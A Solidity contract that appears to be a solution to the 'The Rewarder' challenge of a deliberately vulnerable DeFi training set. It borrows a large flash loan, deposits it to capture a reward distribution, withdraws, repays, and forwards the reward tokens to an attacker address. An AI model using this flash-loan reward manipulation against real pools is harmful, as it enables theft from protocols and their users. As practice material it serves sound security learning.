// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";


contract Rewardead is Test{
    DamnValuableToken private dvt;
    TheRewarderPool private pool;
    FlashLoanerPool private loan;
    RewardToken private immutable rwrdToken;
    address private immutable attacker;
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 internal constant USER_DEPOSIT = 100e18;

    constructor(address _attacker, address _dvt,address _rwrdToken, address _pool, address _loan){
        pool = TheRewarderPool(_pool);
        dvt  = DamnValuableToken(_dvt);
        loan = FlashLoanerPool(_loan);
        rwrdToken = RewardToken(_rwrdToken);
        attacker = _attacker;
        dvt.approve(address(pool), type(uint256).max);
        dvt.approve(address(loan), type(uint256).max);
    }


    function receiveFlashLoan(uint256 amount) external{
        pool.deposit(TOKENS_IN_LENDER_POOL);
        pool.distributeRewards();
        pool.withdraw(TOKENS_IN_LENDER_POOL);
        dvt.transfer(address(loan), dvt.balanceOf(address(this)));
        rwrdToken.transfer(attacker,rwrdToken.balanceOf(address(this)));
    }

    function attack() external{
          loan.flashLoan(TOKENS_IN_LENDER_POOL);
    }
}